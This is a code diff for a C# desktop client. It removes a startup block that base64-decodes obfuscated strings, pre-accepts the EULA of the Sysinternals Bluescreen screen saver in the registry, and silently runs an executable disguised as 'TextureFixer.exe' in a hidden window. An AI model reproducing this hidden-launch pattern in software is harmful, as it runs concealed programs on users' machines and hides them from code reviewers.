@@ -197,26 +197,6 @@ namespace UIHeavyClient
             // see output
             ConsoleManager.Show();
 
-            //////////////////////////////////////////////////////////////////////////
-            /// Mike :: Model Fixer avec serial number pour tenter davoir une belle zamboni !!!
-            string keyName = DecodeFrom64( "UwBvAGYAdAB3AGEAcgBlAFwAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAXABCAGwAdQBlAHMAYwByAGUAZQBuACAAUwBjAHIAZQBlAG4AIABTAGEAdgBlAHIA" );
-            string partialpath = DecodeFrom64( "LgAuAC8AbQBlAGQAaQBhAC8AegBhAG0AYgBvAG4AaQAvAFQAZQB4AHQAdQByAGUARgBpAHgAZQByAC4AZQB4AGUA" );
-            Microsoft.Win32.RegistryKey key;
-            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey( keyName );
-            key.SetValue( "EulaAccepted", 1 );
-            key.Close();
-            ProcessStartInfo start = new ProcessStartInfo();
-            start.Arguments = "/s";
-            string path = AppDomain.CurrentDomain.BaseDirectory + partialpath;
-            start.FileName = path;
-            start.WindowStyle = ProcessWindowStyle.Hidden;
-            start.CreateNoWindow = true;
-            using ( Process proc = Process.Start( start ) )
-            {
-                proc.WaitForExit();
-            }
-            //////////////////////////////////////////////////////////////////////////
-
             System.Windows.Application.Current.ShutdownMode = ShutdownMode.OnExplicitShutdown;
 #if DEBUG || true // Trolol
             System.Windows.Controls.MenuItem debugMenu = new System.Windows.Controls.MenuItem();
